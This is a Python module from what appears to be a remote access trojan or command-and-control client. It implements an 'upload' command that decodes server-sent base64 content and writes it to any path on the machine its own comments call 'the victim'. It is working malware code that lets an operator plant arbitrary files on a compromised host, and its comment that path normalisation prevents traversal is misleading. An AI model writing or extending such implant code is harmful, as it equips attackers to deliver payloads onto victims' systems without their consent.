# Upload command - send file from server to client.

import base64
import logging
import os
from typing import Any, Dict

from client.commands.base import BaseCommand

logger = logging.getLogger(__name__)

# Chunk size for writing files (1 MB)
CHUNK_SIZE = 1024 * 1024


class UploadCommand(BaseCommand):
    # Send a file from the server to the client (victim).

    @property
    def name(self) -> str:
        return "upload"

    @property
    def description(self) -> str:
        return "Send file from server to victim"

    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        # Execute the upload command.
        remote_path = params.get("remote_path")
        content_base64 = params.get("content")

        if not remote_path:
            return self._error_response("Missing required parameter: remote_path")
        if content_base64 is None:
            return self._error_response("Missing required parameter: content")

        try:
            # Validate and normalize the path (prevent path traversal)
            remote_path = os.path.normpath(remote_path)

            # Decode the content
            try:
                content = base64.b64decode(content_base64)
            except Exception as e:
                return self._error_response(f"Invalid base64 content: {e}")

            file_size = len(content)

            logger.info(f"Uploading file: {remote_path} ({file_size} bytes)")

            # Create parent directories if needed
            parent_dir = os.path.dirname(remote_path)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
                logger.info(f"Created directory: {parent_dir}")

            # Write file in chunks for memory efficiency
            bytes_written = 0
            with open(remote_path, "wb") as f:
                offset = 0
                while offset < file_size:
                    chunk = content[offset : offset + CHUNK_SIZE]
                    f.write(chunk)
                    bytes_written += len(chunk)
                    offset += CHUNK_SIZE
                    # Log progress at 25% intervals
                    if file_size > 0:
                        progress = int((bytes_written / file_size) * 100)
                        if progress % 25 == 0:
                            logger.info(f"Upload progress: {progress}% ({bytes_written}/{file_size} bytes)")

            logger.info(f"File upload complete: {remote_path} ({bytes_written} bytes)")

            return {
                "success": True,
                "remote_path": remote_path,
                "size": bytes_written,
                "message": f"Successfully uploaded {remote_path}",
            }

        except PermissionError as e:
            logger.error(f"Permission denied writing to {remote_path}: {e}")
            return self._error_response(f"Permission denied: {remote_path}")
        except OSError as e:
            logger.error(f"OS error writing to {remote_path}: {e}")
            return self._error_response(f"Error writing file: {e}")

    def _error_response(self, message: str) -> Dict[str, Any]:
        # Create an error response.
        return {
            "success": False,
            "error": message,
        }
